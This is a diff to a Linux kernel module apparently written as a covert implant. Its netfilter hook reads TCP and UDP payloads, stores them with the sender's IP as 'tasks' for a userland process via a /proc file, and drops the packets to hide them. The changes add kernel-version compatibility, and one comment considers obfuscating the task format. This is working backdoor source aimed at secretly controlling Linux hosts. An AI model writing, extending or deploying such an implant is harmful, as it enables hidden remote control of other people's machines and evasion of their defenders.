@@ -18,12 +18,17 @@ MODULE_AUTHOR("monstars");
 MODULE_DESCRIPTION("nothin but net");
 MODULE_LICENSE("GPL");
 
-static struct nf_hook_ops s_hookops;
-static struct proc_dir_entry* s_procfile;
-static struct proc_ops s_procfileops;
+static struct nf_hook_ops s_hookops = {0};
+static struct proc_dir_entry* s_procfile = NULL;
 
-static bool s_task_pending;
-static char s_current_task[MAX_DATA_SIZE];
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
+static struct proc_ops s_procfileops;
+#else
+static struct file_operations s_procfileops;
+#endif
+
+static bool s_task_pending = false;
+static char s_current_task[MAX_DATA_SIZE] = {0};
 
 // Procfile READ callback - reports the stored task to userland
 ssize_t read_callback(struct file* filep, char __user* buf, size_t count, loff_t* ppos)
@@ -84,7 +89,6 @@ unsigned int nf_callback(void* priv, struct sk_buff* sockbuf, const struct nf_ho
                 {
                     data += sizeof(struct tcphdr);
                 }
-
             }
             else if (IPPROTO_UDP == iph->protocol)
             {
@@ -107,14 +111,14 @@ unsigned int nf_callback(void* priv, struct sk_buff* sockbuf, const struct nf_ho
                 if (NULL != data)
                 {
                     KERNEL_LOG("MONSTARS_NF : Received:  %s\n", data);
-                    // TODO: this overwrites any pending task-- do we want this?
-                    strncpy(s_current_task, data, MAX_DATA_SIZE);
+                    // TODO: obfuscate fmt?
+                    snprintf(s_current_task, MAX_DATA_SIZE, "%pI4;%s\n", &iph->saddr, data);
                     s_task_pending = true;
                 }
                 retval =  NF_DROP;
             }
         }
-    }    
+    }
     return retval;
 }
 
@@ -142,8 +146,14 @@ int init_module()
     }
 
     // Declare and initialize /proc file hook
+    
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
     s_procfileops.proc_read = read_callback;
     s_procfileops.proc_write = write_callback;
+#else
+    s_procfileops.read = read_callback;
+    s_procfileops.write = write_callback;
+#endif
     
     s_procfile = proc_create(PROCFS_FILENAME, PROCFS_PERMISSIONS, NULL, &s_procfileops);
     if (NULL == s_procfile)
